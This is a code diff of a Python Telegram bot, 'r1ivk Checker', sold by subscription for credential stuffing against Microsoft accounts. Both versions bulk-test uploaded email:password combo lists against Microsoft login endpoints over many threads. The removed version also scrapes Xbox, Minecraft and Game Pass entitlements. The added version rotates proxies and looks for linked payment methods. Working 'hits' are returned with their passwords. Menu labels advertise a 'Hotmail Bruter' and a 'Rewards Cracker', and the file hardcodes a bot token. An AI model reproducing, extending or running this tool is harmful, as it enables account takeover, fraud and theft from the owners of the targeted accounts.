@@ -1,529 +1,263 @@
-# -*- coding: utf-8 -*-
-"""
-r1ivk Checker ⚡ - Pro Inline Menu & Multi-Mode Bot
-"""
-
-import os
-import re
+import logging
+import asyncio
 import time
 import requests
-import threading
-from urllib.parse import urlparse, parse_qs
-import urllib3
+import random
+from datetime import datetime, timedelta
+from concurrent.futures import ThreadPoolExecutor
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, CallbackQueryHandler, MessageHandler, filters
 
-urllib3.disable_warnings()
-
-# =================== Configuration ===================
-TELEGRAM_BOT_TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
+TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
 OWNER_USERNAME = "r1ivk"
-DAILY_LIMIT = 10000
 
+vip_subscriptions = {}
 active_scans = {}
-user_usage = {}
-user_selected_mode = {}
-# =====================================================
+user_proxies = {}  # لتخزين قائمة البروكسيات الخاصة بكل مستخدم
 
-def get_today_date():
-    return time.strftime("%Y-%m-%d")
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
-def check_user_limit(user_id, username, total_lines):
-    if username and username.lower() == OWNER_USERNAME.lower():
-        return True, "Owner bypass active."
-    
-    today = get_today_date()
-    if user_id not in user_usage or user_usage[user_id]["date"] != today:
-        user_usage[user_id] = {"date": today, "count": 0}
-        
-    current_used = user_usage[user_id]["count"]
-    if current_used + total_lines > DAILY_LIMIT:
-        remaining = max(0, DAILY_LIMIT - current_used)
-        return False, f"⚠️ Daily limit reached! You have {remaining}/{DAILY_LIMIT} lines remaining today.\n\nTo upgrade your plan or get unlimited access, contact the owner: @{OWNER_USERNAME}"
-    
-    return True, ""
-
-def update_user_usage(user_id, count):
-    today = get_today_date()
-    if user_id in user_usage and user_usage[user_id]["date"] == today:
-        user_usage[user_id]["count"] += count
-
-def extract_ppft(text):
-    patterns = [
-        r'name="PPFT"[^>]*value="([^"]+)"',
-        r'value="([^"]+)"[^>]*name="PPFT"',
-        r'"PPFT":"([^"]+)"',
-    ]
-    for pattern in patterns:
-        match = re.search(pattern, text, re.IGNORECASE)
-        if match:
-            return match.group(1).replace('\\/', '/').replace('\\"', '"')
-    return None
-
-def extract_url_post(text):
-    patterns = [
-        r'"urlPost":"([^"]+)"',
-        r"urlPost:'([^']+)'",
-        r'id="fmHF"\s+action="([^"]+)"',
-    ]
-    for pattern in patterns:
-        match = re.search(pattern, text, re.IGNORECASE)
-        if match:
-            return match.group(1).replace('\\/', '/')
-    return None
-
-def check_single_account(combo):
-    parts = combo.split(':')
-    if len(parts) < 2:
-        return "invalid"
-
-    email = parts[0].strip()
-    password = ':'.join(parts[1:]).strip()
-
-    session = requests.Session()
-    session.verify = False
-
-    try:
-        sftag_url = (
-            "https://login.live.com/oauth20_authorize.srf"
-            "?client_id=00000000402B5328"
-            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
-            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
-            "&display=touch"
-            "&response_type=token"
-            "&locale=en"
-        )
-        resp = session.get(sftag_url, timeout=15)
-        sftag = extract_ppft(resp.text)
-        url_post = extract_url_post(resp.text)
-
-        if not sftag or not url_post:
-            return "bad"
-
-        login_data = {
-            'login': email,
-            'loginfmt': email,
-            'passwd': password,
-            'PPFT': sftag,
-            'type': '11',
-            'NewUser': '1',
-            'LoginOptions': '3',
-            'i19': '0',
-        }
-        headers = {
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Referer': sftag_url,
-            'Origin': 'https://login.live.com',
-        }
-        login_req = session.post(url_post, data=login_data, headers=headers, allow_redirects=True, timeout=15)
-        login_text = login_req.text.lower()
-
-        ms_token = None
-        if 'access_token' in login_req.url:
-            ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
-        elif 'access_token' in login_text:
-            token_match = re.search(r'access_token=([^&\s\"\']+)', login_text)
-            if token_match:
-                ms_token = token_match.group(1)
-
-        if any(x in login_text for x in ["password is incorrect", "account doesn't exist", "passwords don't match"]):
-            return "bad"
-        elif any(x in login_text for x in ["recover", "locked", "help us protect", "verify your identity", "two-step", "additional security"]):
-            return "twofa"
-
-        if not ms_token:
-            return "bad"
-
-        # Xbox Auth & Details
-        xb_payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
-        xb_headers = {'Content-Type': 'application/json', 'Accept': 'application/json'}
-        xb_req = session.post('https://user.auth.xboxlive.com/user/authenticate', json=xb_payload, headers=xb_headers, timeout=15)
-
-        if xb_req.status_code != 200:
-            return "bad"
-
-        xb_token = xb_req.json()['Token']
-        uhs = xb_req.json()['DisplayClaims']['xui'][0]['uhs']
-
-        gamertag = "N/A"
-        gamerscore = "0"
-        gscore_int = 0
-
-        try:
-            xsts_xb_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "http://xboxlive.com", "TokenType": "JWT"}
-            xsts_xb_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_xb_payload, headers=xb_headers, timeout=15)
-            if xsts_xb_req.status_code == 200:
-                xsts_xb_token = xsts_xb_req.json()['Token']
-                prof_req = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore", 
-                                       headers={"Authorization": f"XBL3.0 x={uhs};{xsts_xb_token}", "x-xbl-contract-version": "2"}, timeout=15)
-                if prof_req.status_code == 200:
-                    settings = prof_req.json().get('profileUsers', [{}])[0].get('settings', [])
-                    for s in settings:
-                        if s['id'] == 'Gamertag': gamertag = s['value']
-                        if s['id'] == 'Gamerscore': 
-                            gamerscore = s['value']
-                            try: gscore_int = int(gamerscore)
-                            except: gscore_int = 0
-        except:
-            pass
-
-        has_gp = False
-        has_mc = False
-        gp_type = "No"
-        mc_ent_text = ""
-        games_list = []
-
-        try:
-            xsts_store_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "https://purchase.mp.microsoft.com", "TokenType": "JWT"}
-            xsts_store_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_store_payload, headers=xb_headers, timeout=15)
-            if xsts_store_req.status_code == 200:
-                xsts_store_token = xsts_store_req.json()['Token']
-                licenses_req = session.get("https://purchase.mp.microsoft.com/v8/users/me/products?itemTypes=Game,Consumable,Durable",
-                                            headers={"Authorization": f"XBL3.0 x={uhs};{xsts_store_token}"}, timeout=15)
-                if licenses_req.status_code == 200:
-                    items = licenses_req.json().get('items', [])
-                    for item in items:
-                        p_id = item.get('productId', '')
-                        if p_id: games_list.append(p_id)
-        except:
-            pass
-
-        try:
-            xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
-            xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=xsts_mc_payload, headers=xb_headers, timeout=15)
-            if xsts_mc_req.status_code == 200:
-                xsts_mc_token = xsts_mc_req.json()['Token']
-                mc_auth = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', 
-                                       json={'identityToken': f"XBL3.0 x={uhs};{xsts_mc_token}"}, 
-                                       headers={'Content-Type': 'application/json'}, timeout=15)
-                if mc_auth.status_code == 200:
-                    mc_token = mc_auth.json().get('access_token')
-                    if mc_token:
-                        ent_req = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=15)
-                        if ent_req.status_code == 200:
-                            mc_ent_text = ent_req.text
-        except:
-            pass
-
-        if 'product_game_pass_ultimate' in mc_ent_text or any('gamepass' in g.lower() for g in games_list):
-            gp_type = "Ultimate"
-            has_gp = True
-        elif 'product_game_pass_pc' in mc_ent_text:
-            gp_type = "PC"
-            has_gp = True
-
-        has_mc = 'product_minecraft' in mc_ent_text or any('minecraft' in g.lower() for g in games_list)
-
-        hit_info = f"{email}:{password} | Gamertag: {gamertag} | G-Score: {gamerscore} | MC: {has_mc} | GP: {gp_type} | Items: {len(games_list)}"
-
-        if has_gp or has_mc or gscore_int > 0 or len(games_list) > 0:
-            return {"status": "hit", "mc": has_mc, "gp": has_gp, "live": True, "info": hit_info}
+def is_user_vip(user_id, username):
+    if username == OWNER_USERNAME:
+        return True
+    if user_id in vip_subscriptions:
+        if datetime.now() < vip_subscriptions[user_id]:
+            return True
         else:
-            return {"status": "live", "info": hit_info}
+            del vip_subscriptions[user_id]
+            return False
+    return False
 
-    except Exception:
-        return "error"
-    finally:
-        session.close()
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    keyboard = [
+        [InlineKeyboardButton("🪟 Microsoft Checker (Xbox/MC)", callback_data="chk_microsoft")],
+        [InlineKeyboardButton("🎁 Xbox Codes & Balance Checker", callback_data="chk_xbox_codes")],
+        [InlineKeyboardButton("🌐 Upload Proxies List", callback_data="upload_proxy")],
+        [InlineKeyboardButton("💎 VIP Subscription Plans", callback_data="subscription")],
+        [InlineKeyboardButton("📊 My Statistics", callback_data="stats")]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    welcome_text = f"Welcome, {user.first_name}, to `r1ivk High-Speed Checker`.\n\nSelect a service or upload your proxies first:"
+    
+    if update.message:
+        await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode="Markdown")
+    elif update.callback_query:
+        await update.callback_query.message.edit_text(welcome_text, reply_markup=reply_markup, parse_mode="Markdown")
 
-def send_telegram_message(chat_id, text, reply_markup=None):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
-    if reply_markup:
-        payload["reply_markup"] = reply_markup
-    try:
-        resp = requests.post(url, json=payload, timeout=10).json()
-        if "result" in resp:
-            return resp["result"].get("message_id")
-    except:
-        pass
-    return None
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    data = query.data
+    
+    if data.startswith("chk_"):
+        checker_type = data.replace("chk_", "")
+        context.user_data['checker_type'] = checker_type
+        await query.message.edit_text(f"🚀 **{checker_type.upper()} Checker Selected.**\n\nPlease send your combo file (`.txt`) in `email:password` format:", parse_mode="Markdown")
+    elif data == "upload_proxy":
+        context.user_data['waiting_for_proxy'] = True
+        await query.message.edit_text("🌐 **Please send your proxies file (`.txt`) now:**\nFormats supported: `IP:Port` or `ip:port:user:pass`", parse_mode="Markdown")
+    elif data == "subscription":
+        keyboard = [[InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")]]
+        await query.message.edit_text(f"💎 **VIP Monthly Plans:** `$15 / Month`\nContact: @{OWNER_USERNAME}", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+    elif data == "stats":
+        user_id = query.from_user.id
+        is_vip = is_user_vip(user_id, query.from_user.username)
+        proxies_count = len(user_proxies.get(user_id, []))
+        keyboard = [[InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")]]
+        await query.message.edit_text(f"📊 **Status:** `{'VIP Member' if is_vip else 'Free User'}`\n🌐 **Loaded Proxies:** `{proxies_count}`", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+    elif data == "main_menu":
+        await start(update, context)
 
-def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
-    payload = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "Markdown"}
-    if reply_markup:
-        payload["reply_markup"] = reply_markup
-    try:
-        requests.post(url, json=payload, timeout=10)
-    except:
-        pass
+async def add_vip(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.username != OWNER_USERNAME or not context.args:
+        return
+    target_id = int(context.args[0])
+    vip_subscriptions[target_id] = datetime.now() + timedelta(days=30)
+    await update.message.reply_text(f"✅ User `{target_id}` upgraded to VIP for 30 days.", parse_mode="Markdown")
 
-def send_telegram_document(chat_id, file_path, caption=""):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
-    try:
-        with open(file_path, 'rb') as f:
-            files = {'document': f}
-            data = {'chat_id': chat_id, 'caption': caption, 'parse_mode': 'Markdown'}
-            requests.post(url, data=data, files=files, timeout=30)
-    except:
-        pass
+async def remove_vip(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.username != OWNER_USERNAME or not context.args:
+        return
+    target_id = int(context.args[0])
+    vip_subscriptions.pop(target_id, None)
+    await update.message.reply_text(f"🚫 VIP removed from `{target_id}`.", parse_mode="Markdown")
 
-def get_main_menu():
-    return {
-        "inline_keyboard": [
-            [{"text": "🎮 Xbox + Minecraft + GP", "callback_data": "mode_xbox"}],
-            [{"text": "🔥 Hotmail Bruter", "callback_data": "mode_hotmail"}],
-            [{"text": "💎 Rewards Cracker", "callback_data": "mode_rewards"}],
-            [{"text": "⚡ Status / Info", "callback_data": "info_menu"}]
-        ]
+# دالة الفحص عبر الأقسام مع دعم البروكسي
+def verify_microsoft_account_with_proxy(email, password, checker_type, proxy=None):
+    session = requests.Session()
+    session.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Accept-Language': 'en-US,en;q=0.9',
+    })
+    
+    proxies_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
+    
+    payload = {
+        'login': email,
+        'passwd': password,
+        'grant_type': 'password',
+        'client_id': '000000004817001b',
+        'scope': 'service::user.auth.xboxlive.com::MBI_SSL'
     }
+    
+    try:
+        response = session.post("https://login.live.com/accessToken.srf", data=payload, proxies=proxies_dict, timeout=7)
+        data = response.json()
+        
+        if "access_token" in data:
+            access_token = data["access_token"]
+            hit_detail = "Valid Login"
+            
+            if checker_type == "xbox_codes":
+                headers = {"Authorization": f"Bearer {access_token}"}
+                balance_res = session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstruments", headers=headers, proxies=proxies_dict, timeout=5)
+                if balance_res.status_code == 200:
+                    instruments = balance_res.json()
+                    balance_found = "No Payment Method"
+                    for item in instruments:
+                        if item.get("paymentMethodFamily") in ["Check", "CreditCard", "PayPal"]:
+                            balance_found = "Active Payment Method Found"
+                            break
+                    hit_detail = f"Hit | {balance_found}"
+                else:
+                    hit_detail = "Hit | Valid Account"
+            
+            return True, hit_detail
+        else:
+            return False, "Bad Credentials"
+    except Exception:
+        return False, "Proxy/Network Error"
 
-def run_checker_process(chat_id, combos, mode_name):
-    total = len(combos)
+# محرك الفحص فائق السرعة بالخيوط المتعددة (ThreadPoolExecutor)
+async def run_live_scanner(lines, checker_type, chat_id, message_id, context, proxies_list):
+    total = len(lines)
     checked = 0
     hits = 0
-    mc_count = 0
-    gp_count = 0
-    live_count = 0
-    twofa_count = 0
-    bad_count = 0
-    errors_count = 0
-    
+    bad = 0
+    errors = 0
     start_time = time.time()
-    active_scans[chat_id] = {"status": "running", "stop": False}
     
-    hit_lines = []
-    
-    markup = {
-        "inline_keyboard": [
-            [{"text": "🔄 Refresh", "callback_data": "refresh_stats"}, {"text": "🛑 Stop Scan", "callback_data": "stop_scan"}]
-        ]
-    }
-    
-    init_msg = f"""🔥 *Starting {mode_name} Scan...*
+    active_scans[chat_id] = True
+    hits_list = []
 
-📊 Combos: {total}
-🧵 Threads: 20
-🔄 Duplicates removed: 0
-"""
-    msg_id = send_telegram_message(chat_id, init_msg)
-    time.sleep(1.5)
-    
-    live_stats_msg = f"""🔥 *LIVE SCAN STATS (Auto-refresh)*
-
-📊 *Total:* {total}
-☑️ *Checked:* 0
-❌ *Bad:* 0
-🎯 *Hits:* 0
-📱 *2FA:* 0
-⚠️ *Errors:* 0
-
-⚡ *CPM:* 0
-⏱ *Elapsed:* 00:00:00
-"""
-    edit_telegram_message(chat_id, msg_id, live_stats_msg, reply_markup=markup)
-    
-    lock = threading.Lock()
-    
-    def worker(combo_item):
-        nonlocal checked, hits, mc_count, gp_count, live_count, twofa_count, bad_count, errors_count
-        if active_scans.get(chat_id, {}).get("stop", False):
-            return
-            
-        res = check_single_account(combo_item)
+    async def update_dashboard(status_text="Running..."):
+        elapsed = int(time.time() - start_time)
+        elapsed_str = time.strftime('%H:%M:%S', time.gmtime(elapsed))
+        cpm = int((checked / max(1, elapsed)) * 60)
         
-        with lock:
-            checked += 1
-            if res == "bad":
-                bad_count += 1
-            elif res == "twofa":
-                twofa_count += 1
-            elif res == "error":
-                errors_count += 1
-            elif isinstance(res, dict):
-                if res["status"] == "hit":
-                    hits += 1
-                    hit_lines.append(res["info"])
-                    if res["mc"]: mc_count += 1
-                    if res["gp"]: gp_count += 1
-                elif res["status"] == "live":
-                    live_count += 1
-
-    threads = []
-    thread_limit = 20
-
-    for combo in combos:
-        if active_scans.get(chat_id, {}).get("stop", False):
-            break
-        while threading.active_count() > thread_limit + 5:
-            time.sleep(0.1)
-            
-        t = threading.Thread(target=worker, args=(combo,))
-        threads.append(t)
-        t.start()
+        progress_pct = (checked / total) * 100 if total > 0 else 100
+        filled_blocks = int(progress_pct // 10)
+        bar = "█" * filled_blocks + "░" * (10 - filled_blocks)
         
-        if checked % 5 == 0 and msg_id:
-            elapsed = int(time.time() - start_time)
-            cpm = int((checked / max(1, elapsed)) * 60)
-            h_str = str(elapsed // 3600).zfill(2)
-            m_str = str((elapsed % 3600) // 60).zfill(2)
-            s_str = str(elapsed % 60).zfill(2)
-            
-            stats_text = f"""🔥 *LIVE SCAN STATS (r1ivk Checker)*
-
-📊 *Total:* {total}
-☑️ *Checked:* {checked} / {total}
-❌ *Bad:* {bad_count}
-🎯 *Hits:* {hits}
-📱 *2FA:* {twofa_count}
-⚠️ *Errors:* {errors_count}
-
-⚡ *CPM:* {cpm}
-⏱ *Elapsed:* {h_str}:{m_str}:{s_str}
-
-🎮 *Gaming Hits:*
-• MC Hits: {mc_count}
-• GamePass Hits: {gp_count}
-• Live Hits: {live_count}
-"""
-            edit_telegram_message(chat_id, msg_id, stats_text, reply_markup=markup)
-
-    for t in threads:
-        t.join()
-
-    elapsed = int(time.time() - start_time)
-    h_str = str(elapsed // 3600).zfill(2)
-    m_str = str((elapsed % 3600) // 60).zfill(2)
-    s_str = str(elapsed % 60).zfill(2)
-    
-    final_text = f"""✅ *{mode_name.upper()} SCAN COMPLETED!*
-
-📊 *Total Checked:* {total}
-🎯 *Hits:* {hits}
-• Minecraft: {mc_count}
-• GamePass: {gp_count}
-• Xbox Live: {live_count}
-📱 *2FA:* {twofa_count}
-❌ *Bad:* {bad_count}
-
-⏱ *Time Taken:* {h_str}:{m_str}:{s_str}
-"""
-    send_telegram_message(chat_id, final_text, reply_markup=get_main_menu())
-    
-    if hit_lines:
-        filename = f"r1ivk_hits_{chat_id}.txt"
-        with open(filename, "w", encoding="utf-8") as f:
-            f.write("\n".join(hit_lines))
-        send_telegram_document(chat_id, filename, caption="📦 *r1ivk Checker - Hits Output File*")
+        text = (
+            f"🔥 **HIGH-SPEED SCANNER STATS**\n\n"
+            f"📊 Total: `{total}`\n"
+            f"✅ Checked: `{checked}`\n"
+            f"❌ Bad: `{bad}`\n"
+            f"🎯 Hits: `{hits}`\n"
+            f"⚠️ Errors: `{errors}`\n\n"
+            f"Progress: `{progress_pct:.1f}%`\n`[{bar}]`\n\n"
+            f"⚡ CPM: `{cpm}`\n"
+            f"⏱ Elapsed: `{elapsed_str}`\n"
+            f"📌 Status: `{status_text}`"
+        )
+        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu")]])
         try:
-            os.remove(filename)
-        except:
+            await context.bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode="Markdown", reply_markup=keyboard)
+        except Exception:
             pass
 
-    if chat_id in active_scans:
-        del active_scans[chat_id]
-
-def run_telegram_bot():
-    print("🤖 r1ivk Checker Bot (Pro Menu Mode) is running...")
-    offset = 0
-    while True:
-        try:
-            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates?offset={offset}&timeout=30"
-            resp = requests.get(url, timeout=35).json()
+    def check_single(combo):
+        nonlocal checked, hits, bad, errors
+        if not active_scans.get(chat_id, True):
+            return
+        if ':' not in combo:
+            errors += 1
+            return
             
-            if "result" in resp:
-                for update in resp["result"]:
-                    offset = update["update_id"] + 1
-                    
-                    if "callback_query" in update:
-                        cq = update["callback_query"]
-                        chat_id = cq["message"]["chat"]["id"]
-                        data = cq["data"]
-                        
-                        if data == "stop_scan":
-                            if chat_id in active_scans:
-                                active_scans[chat_id]["stop"] = True
-                                requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery", json={"callback_query_id": cq["id"], "text": "🛑 Scan stopped!"})
-                        elif data == "refresh_stats":
-                            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery", json={"callback_query_id": cq["id"], "text": "🔄 Refreshed!"})
-                        elif data.startswith("mode_"):
-                            mode_key = data.replace("mode_", "")
-                            user_selected_mode[chat_id] = mode_key
-                            mode_titles = {
-                                "xbox": "Xbox + Minecraft + GP",
-                                "hotmail": "Hotmail Bruter",
-                                "rewards": "Rewards Cracker"
-                            }
-                            selected_title = mode_titles.get(mode_key, "Selected Mode")
-                            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery", json={"callback_query_id": cq["id"], "text": f"Selected: {selected_title}"})
-                            send_telegram_message(chat_id, f"📁 *Mode Selected: {selected_title}*\n\n👉 Now send your `.txt` combo file to start checking!")
-                        elif data == "info_menu":
-                            requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery", json={"callback_query_id": cq["id"], "text": "Status Info"})
-                            info_text = f"""⚡ *r1ivk Checker Status*
+        email, password = combo.split(':', 1)
+        proxy = random.choice(proxies_list) if proxies_list else None
+        
+        is_hit, details = verify_microsoft_account_with_proxy(email, password, checker_type, proxy)
+        
+        checked += 1
+        if is_hit:
+            hits += 1
+            hits_list.append(f"[HIT] {email}:{password} | {details}")
+        else:
+            if "Error" in details:
+                errors += 1
+            else:
+                bad += 1
 
-📌 *Limits:* Max 10,000 lines per day | 20MB | Threads: 20
-👑 *Owner / Support:* @{OWNER_USERNAME} (Contact for subscriptions or unlimited access).
-"""
-                            send_telegram_message(chat_id, info_text, reply_markup=get_main_menu())
+    # استخدام 20 خيطاً متزامناً (Threads) لسرعة صاروخية
+    loop = asyncio.get_running_loop()
+    with ThreadPoolExecutor(max_workers=20) as executor:
+        futures = [loop.run_in_executor(executor, check_single, combo) for combo in lines]
+        
+        while not all(f.done() for f in futures):
+            if not active_scans.get(chat_id, True):
+                break
+            await update_dashboard("Scanning Blazing Fast...")
+            await asyncio.sleep(1)
+            
+        await asyncio.gather(*futures, return_exceptions=True)
 
-                    elif "message" in update:
-                        msg = update["message"]
-                        chat_id = msg["chat"]["id"]
-                        user = msg.get("from", {})
-                        username = user.get("username", "")
-                        
-                        if "document" in msg:
-                            doc = msg["document"]
-                            file_name = doc.get("file_name", "")
-                            
-                            if file_name.endswith(".txt"):
-                                file_id = doc["file_id"]
-                                file_info_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile?file_id={file_id}"
-                                file_info_resp = requests.get(file_info_url, timeout=10).json()
-                                
-                                if "result" in file_info_resp:
-                                    file_path_tg = file_info_resp["result"]["file_path"]
-                                    download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path_tg}"
-                                    
-                                    local_file_name = f"combo_{chat_id}.txt"
-                                    doc_data = requests.get(download_url, timeout=15).content
-                                    with open(local_file_name, "wb") as f:
-                                        f.write(doc_data)
-                                        
-                                    with open(local_file_name, 'r', encoding='utf-8', errors='ignore') as f:
-                                        combos = [line.strip() for line in f if ':' in line]
-                                        
-                                    try:
-                                        os.remove(local_file_name)
-                                    except:
-                                        pass
-                                        
-                                    if not combos:
-                                        send_telegram_message(chat_id, "⚠️ The uploaded file is empty or has invalid format (`email:password`).")
-                                        continue
-                                        
-                                    allowed, limit_msg = check_user_limit(chat_id, username, len(combos))
-                                    if not allowed:
-                                        send_telegram_message(chat_id, limit_msg)
-                                        continue
-                                        
-                                    update_user_usage(chat_id, len(combos))
-                                    
-                                    current_mode = user_selected_mode.get(chat_id, "xbox")
-                                    mode_names_map = {
-                                        "xbox": "Xbox + Minecraft + GP",
-                                        "hotmail": "Hotmail Bruter",
-                                        "rewards": "Rewards Cracker"
-                                    }
-                                    m_name = mode_names_map.get(current_mode, "Xbox Advanced")
-                                    
-                                    threading.Thread(target=run_checker_process, args=(chat_id, combos, m_name), daemon=True).start()
-                            else:
-                                send_telegram_message(chat_id, "⚠️ Please upload a valid `.txt` file.")
-                                
-                        elif "text" in msg:
-                            text = msg["text"].strip()
-                            if text == "/start":
-                                welcome_msg = f"""🔥 *Welcome to r1ivk Checker ⚡*
+    active_scans.pop(chat_id, None)
+    await update_dashboard("Completed ✅")
+    
+    if hits_list:
+        file_name = f"r1ivk_hits_{chat_id}.txt"
+        with open(file_name, "w", encoding="utf-8") as f:
+            f.write("\n".join(hits_list))
+        with open(file_name, "rb") as f:
+            await context.bot.send_document(chat_id=chat_id, document=f, caption=f"🎯 **Scan Finished! Total Hits: {hits}**", parse_mode="Markdown")
 
-*Please select a checking mode from the menu below:*
-• Limits: Max 10,000 lines | Threads limited by plan
-• Duplicate remover: Automatically removes duplicate combos from your file before scanning!
+async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    chat_id = update.effective_chat.id
+    
+    file = await update.message.document.get_file()
+    file_path = f"downloaded_{user.id}.txt"
+    await file.download_to_drive(file_path)
+    
+    # فحص إذا كان الملف عبارة عن بروكسيات
+    if context.user_data.get('waiting_for_proxy'):
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            proxies = [line.strip() for line in f if line.strip()]
+        user_proxies[user.id] = proxies
+        context.user_data['waiting_for_proxy'] = False
+        await update.message.reply_text(f"✅ Successfully loaded `{len(proxies)}` proxies!", parse_mode="Markdown")
+        return
 
-👑 *Owner:* @{OWNER_USERNAME} (Contact for subscriptions)."""
-                                send_telegram_message(chat_id, welcome_msg, reply_markup=get_main_menu())
-        except Exception as e:
-            print(f"Error: {e}")
-            time.sleep(5)
+    # فحص إذا كان الملف عبارة عن كومبو
+    checker_type = context.user_data.get('checker_type')
+    if not checker_type:
+        await update.message.reply_text("⚠️ Please select a checker type first using /start")
+        return
 
-if __name__ == "__main__":
-    run_telegram_bot()
+    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+        lines = [line.strip() for line in f if ':' in line]
+        
+    if not lines:
+        await update.message.reply_text("❌ The uploaded file is empty or invalid format.")
+        return
+
+    proxies_list = user_proxies.get(user.id, [])
+    initial_msg = await update.message.reply_text(f"🚀 Initializing high-speed scanner (Proxies: {len(proxies_list)})...", parse_mode="Markdown")
+    asyncio.create_task(run_live_scanner(lines, checker_type, chat_id, initial_msg.message_id, context, proxies_list))
+
+def main():
+    app = ApplicationBuilder().token(TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("vip", add_vip))
+    app.add_handler(CommandHandler("unvip", remove_vip))
+    app.add_handler(CallbackQueryHandler(button_handler))
+    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+
+    print("High-Speed Checker Bot is running...")
+    app.run_polling()
+
+if __name__ == '__main__':
+    main()
